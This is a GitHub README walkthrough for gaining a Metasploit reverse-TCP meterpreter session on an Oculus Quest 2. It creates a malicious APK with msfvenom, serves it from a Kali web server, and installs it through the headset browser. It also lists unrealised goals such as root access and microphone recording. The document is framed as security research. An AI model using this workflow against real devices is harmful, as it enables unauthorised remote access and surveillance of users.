# Kali - Android Reverse TCP Handler Exploit on Oculus Quest2
### Oculus Quest 2 &amp; Kali Linux Exploit
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/logo%20main.png)


Prerequisite Setup:
Oculus Quest 2 Developer Mode Enabled

Steps:
Configure WebServer from Kali <br/>
sudo python3 -m http.server --bind 127.0.0.1 9000 <br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/apache%20webserver.png)

Configure localtunnel for browser redirect (optional) <br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/localtunnel.png)

Confirm access to webserver on custom port
Create msfvenom malicious android .apk & put on desktop<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/msfvenom.png)

Launch msfconsole and use exploit/multi/handler for android reverse_tcp payload & 
set LHOST<br/>
show options<br/>
exploit<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/TCP%20handler.png)

Download & Install androidApp.apk from WebServer<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/oculus%20browser.png)

Run MainActivity com.metasploit.stage<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/unsupported%20apps.png)

Sysinfo<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/sysinfo.png)

help command shows all the options. app_list shows all the installed applications:<br/>
![This is an image](https://raw.githubusercontent.com/georgebluff/Kali/main/sysinfo.png) <br/>
Here is a full list of everything installed <br/>
[a link](https://github.com/georgebluff/Kali/blob/main/app_list_full.txt)


Not working:

- Get root permissions to device
- Streaming oculus screen to attacker PC remotely
- Force enable/record guardan boundares
- Enable/record microphone
- Wireshark analysis on Oculus for Facebook Identity Auth
  
Links:<br/>
  QuestEscape OS & Firmware Review - https://github.com/QuestEscape/research
  Access Android with Metasploit Kali (Cybersecurity) - https://www.youtube.com/watch?v=YRm-St0bJhU <br/>
  How To Set Up Port Forwarding in Kali Linux Without Router Access | Kali Linux 2021.2 - https://www.youtube.com/watch?v=juu5PM0_NUI <br/>
  Kali http server setup - https://linuxconfig.org/kali-http-server-setup <br/>
  Exploiting Android Devices using Metasploit in Kali Linux - https://thehackerstuff.com/exploiting-android-devices-using-metasploit-in-kali-linux/
  
Notes: This infomation is for training and security research purposes only.
